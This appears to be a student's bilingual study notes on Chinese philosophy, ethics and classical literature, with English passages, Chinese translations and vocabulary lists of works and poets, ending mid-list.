<h4 id="Buddhist-Philosophy-During-the-Sui-and-Tang-Dynasties-隋唐佛学"><a class="header-anchor" href="#Buddhist-Philosophy-During-the-Sui-and-Tang-Dynasties-隋唐佛学">¶</a>Buddhist Philosophy During the Sui and Tang Dynasties (隋唐佛学)</h4>
<ul>
<li>
<p>During the Sui and Tang dynasties, Buddhism reached its apex (顶点). The Buddhist philosophy became aligned with the wisdom of Chinese philosophers. It mainly discusses the relationship between the subjective and the objective. By analyzing the spiritual phenomena and human rationality, it attempts to gain insight into the universe and human life.</p>
<blockquote>
<p>隋唐时期，佛教达到了顶峰。佛教哲学与中国哲学家的智慧相结合。主要论述了主观与客观的关系。它试图通过对精神现象和人类理性的分析来洞察宇宙和人类生活</p>
</blockquote>
</li>
</ul>
<h4 id="Neo-Confucianism-During-the-Song-and-Ming-Dynasties-宋明理学"><a class="header-anchor" href="#Neo-Confucianism-During-the-Song-and-Ming-Dynasties-宋明理学">¶</a>Neo-Confucianism During the Song and Ming Dynasties (宋明理学)</h4>
<ul>
<li>
<p>During the Song and Ming dynasties, the rationalistic Confucian philosophy was of great influence. A new Confucianism developed by incorporating Taoism and Buddhism. It mainly discusses the relationship between human beings, between man and nature, and between man and society, as well as the nature of human being.</p>
<blockquote>
<p>宋明时期，儒家的理性主义哲学影响很大。一种新的儒家思想是由道教和佛教相结合而形成的。它主要讨论人与人、人与自然、人与社会的关系，以及人的本质。</p>
</blockquote>
</li>
<li>
<p>Neo-Confucianism has two main schools, the Schools of Principle (理学), and the School of Mind (心学). The former was represented by Zhou Dunyi, Cheng Hao, Cheng Yi and Zhu Xi, who argues that “rationalism” was eternal and was a spiritual existence before the world existed and that all things in the world were derived from “rationalism”. The latter was represented by Lu Jiuyuan and Wang Shouren, who advocated that “there is nothing outside the mind and no rationalism (or reason) outside the mind” and that “subjective consciousness is the origin of all things in the world”.</p>
<blockquote>
<p>宋明理学有两大流派:理学和心学。前者以周敦颐、程浩、程颐、朱熹为代表，他们认为“理”是永恒的，是世界存在之前的一种精神存在，世界上的一切事物都来源于“理”。后者以陆九渊、王守仁为代表，主张“心外无事，心外无理”，“主观意识是世间万物的本源”。</p>
</blockquote>
</li>
</ul>
<h4 id="Application-Philosophy-During-the-Ming-and-Qing-Dynasties-明清实学"><a class="header-anchor" href="#Application-Philosophy-During-the-Ming-and-Qing-Dynasties-明清实学">¶</a>Application Philosophy During the Ming and Qing Dynasties (明清实学)</h4>
<ul>
<li>
<p>During the Ming and Qing dynasties, philosophy focused on “self-examination”. The application philosophy stuck to the application of philosophy on the state affairs. People were searching for the answers to specific issues instead of abstract study. Creative ideas were encouraged.</p>
<blockquote>
<p>明清时期，哲学注重“自省”。明清实学坚持哲学在国家事务中的应用。人们在寻找具体问题的答案，而不是抽象的研究。鼓励创造性的想法。</p>
</blockquote>
</li>
</ul>
<h3 id="Basic-Features-of-Ancient-Chinese-Philosophy"><a class="header-anchor" href="#Basic-Features-of-Ancient-Chinese-Philosophy">¶</a>Basic Features of Ancient Chinese Philosophy</h3>
<ul>
<li>
<p>Despite the varieties of schools of philosophy, basically, ancient Chinese philosophers share the following common features:</p>
<blockquote>
<p>尽管哲学流派繁多，但基本上，中国古代哲学家有以下共同特点:</p>
</blockquote>
</li>
</ul>
<h4 id="Stress-on-Spiritual-Existence"><a class="header-anchor" href="#Stress-on-Spiritual-Existence">¶</a>Stress on Spiritual Existence</h4>
<blockquote>
<p>重视精神存在</p>
</blockquote>
<ul>
<li>
<p>Ancient Chinese philosophers studied different kinds of philosophical problems based on reality and experience, but all of them paid attention to the study of existence. For example, Confucianism’s knowledge of life through disposition and consciousness, Taoism’s search for spiritual freedom and Buddhism’s “Nirvana (涅槃)” all reflect their pursuit of complete spiritual happiness.</p>
<blockquote>
<p>中国古代哲学家在现实和经验的基础上研究了各种各样的哲学问题，但他们都注重对存在的研究。例如，儒家对人生的认识是通过性情和意识，道教对精神自由的追求，佛教的“涅槃”都体现了他们对精神完全幸福的追求。</p>
</blockquote>
</li>
</ul>
<h4 id="Stress-on-Practice"><a class="header-anchor" href="#Stress-on-Practice">¶</a>Stress on Practice</h4>
<blockquote>
<p>重视实践</p>
</blockquote>
<ul>
<li>
<p>One of the most important questions that ancient Chinese philosophers were concerned with was the relationship between knowledge and practice, According to Confucius, &quot;To prefer it is better than only to know it. To delight in it is better than merely to prefer it. (知之者不如好之者，好之者不如乐之者。) &quot; “To delight in it” means “to put it into practice and gain pleasure from it”.</p>
<blockquote>
<p>中国古代哲学家关心的最重要的问题之一是知识与实践的关系。孔子说:“知之者不如好之者，好之者不如乐之者。”“乐在其中”的意思是“把它付诸实践并从中获得乐趣”。</p>
</blockquote>
</li>
</ul>
<h4 id="Stress-on-Morality"><a class="header-anchor" href="#Stress-on-Morality">¶</a>Stress on Morality</h4>
<blockquote>
<p>重视道德</p>
</blockquote>
<ul>
<li>
<p>Essentially, every school of ancient Chinese philosophy was a kind of moral philosophy. Almost all of them stressed moral practice. Through it, individuals could realize moral achievement and enjoy things a healthy social environment could provide–the monarch’s benevolence and lower officials’ loyalty, <u>the father’s kindness and son’s filial piety</u> (孝顺), <u>the elder brother’s friendliness and younger one’s respect</u>, and the mutual trust between friends.</p>
<blockquote>
<p>从本质上讲，中国古代哲学的每一个流派都是一种道德哲学。他们几乎都强调道德实践。通过它，个人可以实现道德成就，享受健康的社会环境所能提供的东西——君主的仁慈和下级官员的忠诚，<u>父慈子孝</u>，<u>兄友弟恭</u>，朋友之间相互信任。</p>
</blockquote>
</li>
</ul>
<h4 id="Stress-on-Harmony"><a class="header-anchor" href="#Stress-on-Harmony">¶</a>Stress on Harmony</h4>
<blockquote>
<p>重视和谐</p>
</blockquote>
<ul>
<li>
<p>The consistent tradition of ancient Chinese philosophy has been its stress on harmony between man and nature, and also between man and man. Mencius said, &quot; Opportunities vouchsafed (赐予) by Heaven are less important than terrestrial advantages, which in turn are less important than the unity among people. (天时不如地利，地利不如人和。) &quot; This well expressed the idea that harmony was the highest principle. Confucius further explained how the realize harmony between man and nature, man and man, man and society, and man and Heaven through the golden mean.</p>
<blockquote>
<p>中国古代哲学的一贯传统是强调人与自然、人与人之间的和谐。孟子说:“天时不如地利，地利不如人和。” 这句话很好地表达了和谐是最高原则的观点。孔子进一步解释了如何通过中庸之道实现人与自然、人与人、人与社会、人与天的和谐。</p>
</blockquote>
</li>
</ul>
<h4 id="Stress-on-Intuition"><a class="header-anchor" href="#Stress-on-Intuition">¶</a>Stress on Intuition</h4>
<blockquote>
<p>强调直觉</p>
</blockquote>
<ul>
<li>
<p>Ancient Chinese philosophy did not adhere to formal rules of structure and system in thought and often resulted in fragmented thoughts written on paper. It was through intuition and reflection on life experiences that philosophical ideas were formed.</p>
<blockquote>
<p>中国古代哲学在思想上不遵循结构和系统的形式规则，常常导致思想的碎片化。正是通过直觉和对生活经验的反思，哲学思想才得以形成。</p>
</blockquote>
</li>
<li>
<p>Chinese Chan Buddhism (禅宗), which is the integration of Buddhist theology with Chinese traditional thinking, preaches epiphany (顿悟) and emphasizes self-restraint and self-reflection by sitting still and reciting Buddhist scriptures (经文).</p>
<blockquote>
<p>中国禅宗是佛教神学与中国传统思想的融合，它宣扬顿悟，强调静坐诵经的自我约束和自我反省。</p>
</blockquote>
</li>
</ul>
<h3 id="Characteristics-of-Chinese-Ethnics-and-Morality"><a class="header-anchor" href="#Characteristics-of-Chinese-Ethnics-and-Morality">¶</a>Characteristics of Chinese Ethnics and Morality</h3>
<blockquote>
<p>中国伦理道德的特点</p>
</blockquote>
<ul>
<li>
<p><u>Ethics</u> is the moral principle for dealing with people. <u>Morality</u> is the social ideology which serves as the norm for people’s life and behaviour. Morals keep social life in order and within boundaries through public opinion.</p>
<blockquote>
<p><u>伦理</u>是与人相处的道德原则。<u>道德</u>是作为人们生活和行为规范的社会意识形态。道德通过公众舆论使社会生活保持秩序并保持在界限之内。</p>
</blockquote>
</li>
<li>
<p>Traditional Chinese ethics include both good and bad elements. Some reflect the high standard or moral pursuit of the Chinese people and embrace ethical wisdom of lasting value, while others are unsuitable in modern society. For example, the three obediences and four virtues and the three cardinal guides and five constant virtues have long been abandoned by the Chinese people.</p>
<blockquote>
<p>中国传统伦理包括好的和坏的因素。有些反映了中国人的高标准或道德追求，具有永恒价值的伦理智慧，而另一些则不适合现代社会。比如三从四德、三纲五常，早就被中国人抛弃了。</p>
</blockquote>
</li>
</ul>
<h4 id="Seeking-Harmony-and-Maintaining-Equilibrium-平衡"><a class="header-anchor" href="#Seeking-Harmony-and-Maintaining-Equilibrium-平衡">¶</a>Seeking Harmony and Maintaining Equilibrium (平衡)</h4>
<blockquote>
<p>寻求和谐与平衡</p>
</blockquote>
<ul>
<li>To the Chinese people, “harmony” is a powerful word. There is nothing it cannot absorb and nothing it cannot cover. Harmony seeks peace, compromise, concord (一致), and unison (调和). Maintaining equilibrium is the ultimate purpose of harmony.</li>
</ul>
<h4 id="Collectivism-over-Individualism"><a class="header-anchor" href="#Collectivism-over-Individualism">¶</a>Collectivism over Individualism</h4>
<blockquote>
<p>凌驾于个人主义之上的集体主义</p>
</blockquote>
<ul>
<li>
<p>Traditional Chinese values attach great importance to collective interest. The interest of the society, the country and the family has always been given top priority, while that of the locality, the part, or the individual is sometimes ignored. An individual’s value can be realized only within society as a whole, as that is the groundwork of one’s existence.</p>
<blockquote>
<p>中国传统价值观非常重视集体利益。社会、国家和家庭的利益总是被放在首位，而地方、部分或个人的利益有时被忽视。一个人的价值只有在整个社会中才能实现，因为这是一个人存在的基础。</p>
</blockquote>
</li>
</ul>
<h4 id="Spiritual-Life-over-Material-Life"><a class="header-anchor" href="#Spiritual-Life-over-Material-Life">¶</a>Spiritual Life over Material Life</h4>
<blockquote>
<p>精神生活高于物质生活</p>
</blockquote>
<ul>
<li>
<p>Chinese people advocate morality in their behaviour. Self-cultivation in morals is emphasized, and is considered to be more important than one’s material pursuit. It is fully characterized by showing filial obedience, being amiable (友善的) to others, respecting ordinary people and appreciating moral conduct.</p>
<blockquote>
<p>中国人崇尚道德。强调道德修养，认为道德修养比物质追求更重要。它的特点是孝顺，待人友善，尊重普通人，欣赏道德行为。</p>
</blockquote>
</li>
</ul>
<h3 id="Religion"><a class="header-anchor" href="#Religion">¶</a>Religion</h3>
<blockquote>
<p>跳过这里以及之后part先</p>
<p>感觉考的可能性不是很大，让我先看看练习</p>
</blockquote>
<h2 id="CHAPTER-2Literature"><a class="header-anchor" href="#CHAPTER-2Literature">¶</a>CHAPTER 2	Literature</h2>
<h3 id="Lead-in-Questions"><a class="header-anchor" href="#Lead-in-Questions">¶</a>Lead-in Questions</h3>
<ul>
<li>
<p><em>The Analects of Confucius</em></p>
<blockquote>
<p>《论语》</p>
</blockquote>
</li>
<li>
<p>quote well-known proverbs</p>
<blockquote>
<p>引用名句</p>
</blockquote>
</li>
<li>
<p>Tang poems</p>
<blockquote>
<p>唐诗</p>
</blockquote>
</li>
<li>
<p>Song ci poems</p>
<blockquote>
<p>宋词</p>
</blockquote>
</li>
<li>
<p>China has a long and rich literary history, but to many westerners, Chinese literature remains an enigma (谜). Much of China’s literacy heritage has been untranslatable, despite scholarly efforts.</p>
<blockquote>
<p>中国有着悠久而丰富的文学史，但对许多西方人来说，中国文学仍然是一个谜。尽管学者们做出了努力，但中国的许多文化遗产仍无法翻译。</p>
</blockquote>
</li>
<li>
<p>For over 3,000 years, Chinese literature has encompassed diversified genres (类型) and forms such as mythology (神话), poetry, essay, fiction and drama. It rivals (与…媲美) the literature of other countries in the world.</p>
<blockquote>
<p>3000多年来，中国文学体裁多样，形式多样，有神话、诗歌、散文、小说、戏剧等。它可以与世界上其他国家的文学相媲美。</p>
</blockquote>
</li>
<li>
<p>Chinese literature can be subdivided into three main periods:</p>
<ul>
<li>classical literature   pre-Qin–4 May 1919</li>
<li>modern literature     1919-1949</li>
<li>contemporary literature    1949–present</li>
</ul>
<blockquote>
<p>中国文学可分为三个主要时期:</p>
<p>古典文学          先秦- 1919年5月4日<br>
现代文学           1919-1949<br>
当代文学          1949年至今</p>
</blockquote>
</li>
<li>
<p>Beginning with primitive mythology, <u>Chinese classical literature</u> developed with <em>The Book of Songs (《诗经》)</em>, <em>The Songs of Chu (《楚辞》)</em>, the prose of the pre-Qin times, <em>hanfu</em> and <em>yuefu</em> folk songs of the Han dynasty, the literary criticism in the Wei and Jin dynasties , the Tang poetry, the <em>Song ci</em> poetry, the Yuan dramas in the Yuan dynasty and the Ming and Qing novels. The literary achievements at the end of the Qing dynasty are mainly poems and novels.</p>
<blockquote>
<p>从原始神话开始，<u>中国古典文学</u>发展到《诗经》、《楚辞》、先秦散文、汉乐府民歌、魏晋文学批评、唐诗、宋词、元曲和明清小说。清末的文学成就主要是诗歌和小说。</p>
</blockquote>
</li>
<li>
<p><u>Modern literature</u> spanned the period from 1919 to the foundation of the People’s Republic of China in 1949. This period was distinctive as it brought along a new and revised literary language, form, and set of content and skills. It focused on people’s lives with strong political overtones, emphasizing opposition to imperialism and feudalism, and advocating the building of a new China.</p>
<blockquote>
<p><u>现代文学</u>的时间跨度从1919年到1949年中华人民共和国成立。这一时期的独特之处在于，它带来了一种新的、经过修订的文学语言、形式、内容和技巧。它关注人民生活，具有强烈的政治色彩，强调反对帝国主义和封建主义，主张建设新中国。</p>
</blockquote>
</li>
<li>
<p><u>Contemporary literature</u> started with the establishment of the PRC in 1949. With the rapid development of economy and the reform and opening-up policy in this period, works in various styles and with different subjects have appeared. Chinese literature has become more prosperous and won an important position in world literature.</p>
<blockquote>
<p><u>当代文学</u>始于1949年中华人民共和国的成立。随着这一时期经济的快速发展和改革开放政策的实施，出现了风格各异、题材各异的作品。中国文学日益繁荣，在世界文学中占有重要地位。</p>
</blockquote>
</li>
</ul>
<h3 id="Classical-Literature"><a class="header-anchor" href="#Classical-Literature">¶</a>Classical Literature</h3>
<blockquote>
<p>古典文学</p>
</blockquote>
<ul>
<li>
<p>Chinese classical literature refers to literary works from the days before the Qin dynasty to the year of 1919, and is virtually an unbroken strand (思想等的一个组成部分) enduring dynastic changes.</p>
</li>
<li>
<p>Long before the written language appeared, there was an oral tradition of fables and legends. Sime of them are still kept in some ancient books as <u>precious heritage of Chinese literature</u>. Over 3,000 years, there has emerged a great variety of excellent works in terms of poems, essays, novels, dramas and so on.</p>
<blockquote>
<p>precious heritage of Chinese literature   宝贵的中华文化遗产</p>
</blockquote>
</li>
</ul>
<h4 id="The-Book-of-Songs-and-The-Songs-of-Chu"><a class="header-anchor" href="#The-Book-of-Songs-and-The-Songs-of-Chu">¶</a>The Book of Songs and The Songs of Chu</h4>
<blockquote>
<p>《诗经》《楚辞》</p>
</blockquote>
<ul>
<li>
<p>Poetry, one of the earliest <u>artistic forms</u>, originated from folk songs before the existence of written Chinese. It content evolved out of people’s everyday life, and reflected their labour and entertainment. <em>The Book of Songs</em> and <em>The Songs of Chu</em> are regarded as the two peaks of China’s earlier literary history.</p>
<blockquote>
<p>诗歌是最早的艺术形式之一，起源于中国文字出现之前的民歌。它的内容是从人们的日常生活中演变而来的，反映了人们的劳动和娱乐。《诗经》和《楚辞》被认为是中国早期文学史上的两个高峰。</p>
</blockquote>
</li>
<li>
<p><em>The Book of Songs</em> is a collection of China’s 305 oldest poems from the early Western Zhou dynasty to the middle of the Spring and Autumn period, and is regarded as the earliest realistic literature in China. As the starting point of Chinese literature. <em>The Book of Songs</em> has provided a deep insight into all aspects of social life of the Zhou dynasty and truly reflected the rise and fall of the Chinese slave society. It has always been worshipped by scholars and has become a cultural gene. In the light of their rhythms, the works can be divided into three sections:</p>
<ul>
<li><em>feng</em> or folk ballads (consisting of 160 ballads from 15 regions)</li>
<li><em>ya</em> or dynastic hymns (consisting of 105 songs, most of which are for entertaining slave owners at feast);</li>
<li><em>song</em> or sacrificial songs (consisting of 40 songs for sacrificial ceremonies attended by slave owners).</li>
</ul>
<blockquote>
<p>《诗经》收录了中国最古老的305首诗歌，时间从西周初到春秋中期，被认为是中国最早的现实主义文学。作为中国文学的起点。《诗经》对周朝社会生活的方方面面提供了深刻的洞察，真实地反映了中国奴隶社会的兴衰。它一直受到学者们的崇拜，成为一种文化基因。根据其节奏，作品可分为三个部分:<br>
风 / 民歌(来自15个地区的160首)</p>
<p>​      雅或王朝赞美诗(由105首歌曲组成，其中大部分是为奴隶主在宴会上娱乐);</p>
<p>​     颂或祭祀歌曲(由40首歌曲组成，用于奴隶主参加的祭祀仪式)。</p>
</blockquote>
</li>
<li>
<p>Many poems in <u><em>The Book of Songs</em></u> portray love stories, social customs and realities in the remote antiquity (上古时期) of China.</p>
<blockquote>
<p><u>《诗经》</u>中的许多诗歌描绘了中国远古时代的爱情故事、社会习俗和现实。</p>
</blockquote>
</li>
<li>
<p><u><em>The Songs of Chu</em></u> follows <em>The Book of Songs</em> as an important poem collection from ancient China with far-reaching influence, Chu Ci (楚辞), as the book’s Chinese name indicates, is derived from the songs of the southern state of Chu during the Warring States period. It pioneered <u>romanticism</u> in Chinese poetry.</p>
<blockquote>
<p><u>《楚辞》</u>是继《诗经》之后，中国古代一部影响深远的重要诗集。楚辞，正如书名所示，源于战国时期楚国南部的歌曲。它开创了中国诗歌的<u>浪漫主义</u>。</p>
</blockquote>
</li>
<li>
<p>The journey is long, I 'll  search up and down.</p>
<blockquote>
<p>路漫漫其修远兮，吾将上下而求索</p>
</blockquote>
</li>
<li>
<p>Unable to realize his ideal, he (屈原) wrote such immortal masterpieces as <em>Sorrow After Departure</em> (《离骚》), <em>Ask Heaven</em> （《天问》）, <em>Nine Elegies</em> （《九章》）, and <em>Nine Songs</em> （《九歌》）. He drowned himself in the Miluo River out of disappointment, sorrow, and anger.</p>
<blockquote>
<p>由于无法实现自己的理想，他(屈原)写下了《离骚》、《天问》、《九章》、《九歌》等不朽的杰作。由于失望、悲伤和愤怒，他投汨罗江自尽</p>
</blockquote>
</li>
<li>
<p>representative work</p>
<blockquote>
<p>代表作</p>
</blockquote>
</li>
<li>
<p><em>The Book of Songs</em> is the fountainhead of realism and <em>The Songs of Chu</em> of romanticism. Later Chinese literature was extended and developed based on these two creation modes.</p>
<blockquote>
<p>《诗经》是现实主义的先驱，《楚辞》是浪漫主义的先驱。后来的中国文学就是在这两种创作模式的基础上扩展和发展起来的。</p>
</blockquote>
</li>
</ul>
<h4 id="Prose-of-the-Pre-Qin-Times"><a class="header-anchor" href="#Prose-of-the-Pre-Qin-Times">¶</a>Prose of the Pre-Qin Times</h4>
<blockquote>
<p>先秦散文</p>
</blockquote>
<ul>
<li>The prose in the pre-Qin times includes historical prose（历史散文） and philosophical prose （诸子散文）</li>
</ul>
<h5 id="Historical-Prose"><a class="header-anchor" href="#Historical-Prose">¶</a>Historical Prose</h5>
<ul>
<li>
<p><em>The Book of History</em></p>
<blockquote>
<p>《尚书》</p>
</blockquote>
</li>
<li>
<p><em>The Spring and Autumn Annals</em></p>
<blockquote>
<p>《春秋》</p>
</blockquote>
</li>
<li>
<p><em>Zuo’s Commentary</em></p>
<blockquote>
<p>《左传》</p>
</blockquote>
</li>
<li>
<p><em>Intrigues of The Warring States</em></p>
<blockquote>
<p>《战国策》</p>
</blockquote>
</li>
<li>
<p><em>Discourses of the States</em></p>
<blockquote>
<p>《国语》</p>
</blockquote>
</li>
</ul>
<h5 id="Philosophical-Prose"><a class="header-anchor" href="#Philosophical-Prose">¶</a>Philosophical Prose</h5>
<ul>
<li>
<p>undergo radical changes</p>
<blockquote>
<p>经历彻底的变革</p>
</blockquote>
</li>
<li>
<p>various schools of thought</p>
<blockquote>
<p>百家思想学派</p>
</blockquote>
</li>
<li>
<p>Confucian School</p>
<blockquote>
<p>儒家学派</p>
</blockquote>
</li>
<li>
<p>Mohist School</p>
<blockquote>
<p>墨家学派</p>
</blockquote>
</li>
<li>
<p>Taoist School</p>
<blockquote>
<p>道家学派</p>
</blockquote>
</li>
<li>
<p>Legalist School</p>
<blockquote>
<p>法家学派</p>
</blockquote>
</li>
<li>
<p>put their ideas into practice</p>
<blockquote>
<p>投入实践</p>
</blockquote>
</li>
<li>
<p>expound their theories</p>
<blockquote>
<p>宣扬理论</p>
</blockquote>
</li>
<li>
<p><em>Daodejing</em></p>
<blockquote>
<p>《道德经》</p>
</blockquote>
</li>
<li>
<p><em>Mozi</em></p>
<blockquote>
<p>《墨子》</p>
</blockquote>
</li>
<li>
<p><em>Mencius</em></p>
<blockquote>
<p>《孟子》</p>
</blockquote>
</li>
<li>
<p><em>Zhuangzi</em></p>
<blockquote>
<p>《庄子》</p>
</blockquote>
</li>
<li>
<p><em>The Analects of Confucius</em></p>
<blockquote>
<p>《论语》</p>
</blockquote>
</li>
</ul>
<h4 id="Literature-in-the-Han-Dynasty"><a class="header-anchor" href="#Literature-in-the-Han-Dynasty">¶</a>Literature in the Han Dynasty</h4>
<ul>
<li>
<p><em>hanfu and yuefu folk songs</em></p>
<blockquote>
<p>汉乐府民歌</p>
</blockquote>
</li>
<li>
<p><em>Sao-style essays</em></p>
<blockquote>
<p>骚体赋</p>
</blockquote>
</li>
<li>
<p><em>long essays</em></p>
<blockquote>
<p>大赋</p>
</blockquote>
</li>
<li>
<p><em>short essays</em></p>
<blockquote>
<p>小赋</p>
</blockquote>
</li>
<li>
<p><em>On Faults of Qin</em></p>
<blockquote>
<p>《过秦论》</p>
</blockquote>
</li>
<li>
<p><em>Records of the Grand Historian</em></p>
<blockquote>
<p>《史记》</p>
</blockquote>
</li>
<li>
<p><em>five-character lines</em></p>
<blockquote>
<p>五言</p>
</blockquote>
</li>
<li>
<p>reflect reality and life of working people</p>
<blockquote>
<p>反映了劳动人民的真实生活</p>
</blockquote>
</li>
<li>
<p><em>Southeast the Peacock Flies</em></p>
<blockquote>
<p>《孔雀东南飞》</p>
</blockquote>
</li>
<li>
<p>denounce feudal ethics</p>
<blockquote>
<p>谴责封建礼教</p>
</blockquote>
</li>
</ul>
<h4 id="Literature-in-the-Wei-Jin-Southern-and-Northern-Dynasties"><a class="header-anchor" href="#Literature-in-the-Wei-Jin-Southern-and-Northern-Dynasties">¶</a>Literature in the Wei, Jin, Southern and Northern Dynasties</h4>
<ul>
<li>
<p>the stories recording spirits and anecdotes</p>
<blockquote>
<p>志人志怪小说</p>
</blockquote>
</li>
<li>
<p>Three Caos and the “Seven Masters of the Jian’an Periods”</p>
<blockquote>
<p>三曹与建安七子</p>
</blockquote>
</li>
<li>
<p>literary figures</p>
<blockquote>
<p>文学人物</p>
</blockquote>
</li>
<li>
<p><em>The Sea</em></p>
<blockquote>
<p>《观沧海》</p>
</blockquote>
</li>
<li>
<p><em>A Short Song</em></p>
<blockquote>
<p>《短歌行》</p>
</blockquote>
</li>
<li>
<p>five-character-a-line poetry</p>
<blockquote>
<p>五言诗</p>
</blockquote>
</li>
<li>
<p><em>The Peach Blossom Spring</em></p>
<blockquote>
<p>《桃花源记》</p>
</blockquote>
</li>
<li>
<p><em>The Literary Mind and the Carving of Dragons</em></p>
<blockquote>
<p>《文心雕龙》</p>
</blockquote>
</li>
<li>
<p>parallel prose</p>
<blockquote>
<p>骈文</p>
</blockquote>
</li>
<li>
<p>literary criticism</p>
<blockquote>
<p>文学批评</p>
</blockquote>
</li>
<li>
<p>seek the beauty of form at the cost of meaning</p>
<blockquote>
<p>为了追求格律工整而牺牲意义</p>
</blockquote>
</li>
</ul>
<h4 id="Tang-Poetry"><a class="header-anchor" href="#Tang-Poetry">¶</a>Tang Poetry</h4>
<ul>
<li>
<p><em>The Complete Anthology of the Tang Poetry</em></p>
<blockquote>
<p>《全唐诗》</p>
</blockquote>
</li>
<li>
<p>Early Tang, High Tang, Middle Tang, and Late Tang</p>
<blockquote>
<p>初唐，盛唐，中唐，晚唐</p>
</blockquote>
</li>
<li>
<p>Four Literart Eminences: Wang Bo, Yang Jiong, Luo Binwang, and Lu Zhaolin</p>
<blockquote>
<p>初唐四杰：王勃、杨炯、骆宾王、卢照邻</p>
</blockquote>
</li>
<li>
<p>“Friendships across the world / make near neighbours of far horizons”</p>
<blockquote>
<p>海内存知己，天涯若比邻</p>
</blockquote>
</li>
<li>
<p>the lingering sorrow of departure</p>
<blockquote>
<p>挥之不去的离愁</p>
</blockquote>
</li>
<li>
<p>literary giants</p>
<blockquote>
<p>文学巨匠</p>
</blockquote>
</li>
<li>
<p>society enjoyed prosperity and stability</p>
<blockquote>
<p>社会繁荣安定</p>
</blockquote>
</li>
<li>
<p>Immortal of Poems → Libai</p>
<blockquote>
<p>诗仙</p>
</blockquote>
<ul>
<li>
<p><em>Thinking in the Silent Night</em></p>
<blockquote>
<p>《静夜思》</p>
</blockquote>
</li>
<li>
<p><em>Hard is the Road to Shu</em></p>
<blockquote>
<p>《蜀道难》</p>
</blockquote>
</li>
<li>
<p><em>Dreaming of Sightseeing in the Tianmu Mountains</em></p>
<blockquote>
<p>《梦游天姥吟留别》</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Sage of Poems→Dufu</p>
<blockquote>
<p>诗圣→杜甫</p>
</blockquote>
<ul>
<li>
<p>a poetic historical account</p>
<blockquote>
<p>诗史</p>
</blockquote>
</li>
<li>
<p>Three Officers</p>
<blockquote>
<p>三吏</p>
</blockquote>
</li>
<li>
<p>Three Partings</p>
<blockquote>
<p>三别</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>frontier poets</p>
<blockquote>
<p>边塞诗人</p>
</blockquote>
</li>
<li>
<p>pastoral poets</p>
<blockquote>
<p>田园诗人</p>
</blockquote>
</li>
<li>
<p><em>The Old Charcoal Seller</em></p>
<blockquote>
<p>《卖炭翁》</p>
</blockquote>
</li>
<li>
<p><em>Song of Eternal Sorrow</em></p>
<blockquote>
<p>《长恨歌》</p>
</blockquote>
</li>
<li>
<p><em>Song of a Pipa Player</em></p>
<blockquote>
<p>《琵琶行》</p>
</blockquote>
</li>
</ul>
<h4 id="Song-Ci-Poetry"><a class="header-anchor" href="#Song-Ci-Poetry">¶</a>Song Ci Poetry</h4>
<ul>
<li>
<p><em>xiaoling</em></p>
<blockquote>
<p>小令</p>
</blockquote>
</li>
<li>
<p><em>zhongdiao</em></p>
<blockquote>
<p>中调</p>
</blockquote>
</li>
<li>
<p><em>changdiao</em></p>
<blockquote>
<p>长调</p>
</blockquote>
</li>
<li>
<p><em>The Beautiful Lady Yu</em></p>
<blockquote>
<p>虞美人</p>
</blockquote>
</li>
<li>
<p><em>Moon on the Western River</em></p>
<blockquote>
<p>西江月</p>
</blockquote>
</li>
<li>
<p><em>Butterfly Loves Flowers</em></p>
<blockquote>
<p>蝶恋花</p>
</blockquote>
</li>
<li>
<p><em>Immortals Meeting on the Magpie Bridge</em></p>
<blockquote>
<p>鹊桥仙</p>
</blockquote>
</li>
<li>
<p>Soft and Tuneful School</p>
<blockquote>
<p>婉约派</p>
</blockquote>
</li>
<li>
<p><em>Slow Slow Song</em></p>
<blockquote>
<p>《声声慢》</p>
</blockquote>
</li>
<li>
<p>Powerful and Free School</p>
<blockquote>
<p>豪放派</p>
</blockquote>
</li>
<li>
<p><em>To the Tune of Charm of a Maiden Singer: The Red Cliff</em></p>
<blockquote>
<p>《念奴娇·赤壁怀古》</p>
</blockquote>
</li>
<li>
<p><em>To the Tune of Water Melody: The Mid-Autumn Festival</em></p>
<blockquote>
<p>《水调歌头·明月几时有》</p>
</blockquote>
</li>
<li>
<p><em>To the Tune of a Riverside Town: Dreaming of His Deceased Wife</em></p>
<blockquote>
<p>《江城子·十年生死两茫茫》</p>
</blockquote>
</li>
<li>
<p><em>Song of Southern Country</em></p>
<blockquote>
<p>《南乡子》</p>
</blockquote>
</li>
<li>
<p><em>Dance of the Cavalry</em></p>
<blockquote>
<p>《破阵子》</p>
</blockquote>
</li>
</ul>
<h4 id="Yuan-Dramas-in-the-Yuan-Dynasty"><a class="header-anchor" href="#Yuan-Dramas-in-the-Yuan-Dynasty">¶</a>Yuan Dramas in the Yuan Dynasty</h4>
<ul>
<li>
<p><em>sanqu</em></p>
<blockquote>
<p>散曲</p>
</blockquote>
</li>
<li>
<p><em>zaju</em></p>
<blockquote>
<p>杂剧</p>
</blockquote>
</li>
<li>
<p><em>Autumn Thought</em> by Ma Zhiyuan</p>
<blockquote>
<p>《天净沙·秋思》 马致远</p>
</blockquote>
</li>
<li>
<p><em>The Injustice to Dou E</em></p>
<blockquote>
<p>《窦娥冤》</p>
</blockquote>
</li>
</ul>
<h5 id="Fiction-in-the-Ming-and-Qing-Dynasties"><a class="header-anchor" href="#Fiction-in-the-Ming-and-Qing-Dynasties">¶</a>Fiction in the Ming and Qing Dynasties</h5>
<ul>
<li>
<p><em>huaben</em></p>
<blockquote>
<p>话本</p>
</blockquote>
</li>
<li>
<p>the Four Great Classical Novels</p>
<blockquote>
<p>四大名著</p>
</blockquote>
</li>
<li>
<p><em>Romance of the Three Kingdoms</em></p>
<blockquote>
<p>《三国演义》</p>
</blockquote>
<ul>
<li>
<p>chapter-by-chapter historical novel</p>
<blockquote>
<p>章回体历史小说</p>
</blockquote>
</li>
<li>
<p>brotherhood</p>
<blockquote>
<p>义气</p>
</blockquote>
</li>
<li>
<p>reveal the characters’ personalities</p>
<blockquote>
<p>反映人物性格</p>
</blockquote>
</li>
<li>
<p>adhere to benevolent policies</p>
<blockquote>
<p>坚持仁政</p>
</blockquote>
</li>
<li>
<p>inexhaustible resourcefulness</p>
<blockquote>
<p>无穷智慧</p>
</blockquote>
</li>
<li>
<p>bravery and straightforward</p>
<blockquote>
<p>勇往无前</p>
</blockquote>
</li>
<li>
<p>loyalty</p>
<blockquote>
<p>忠义</p>
</blockquote>
</li>
<li>
<p>cunning</p>
<blockquote>
<p>奸诈</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><em>Water Margin</em></p>
<blockquote>
<p>《水浒传》</p>
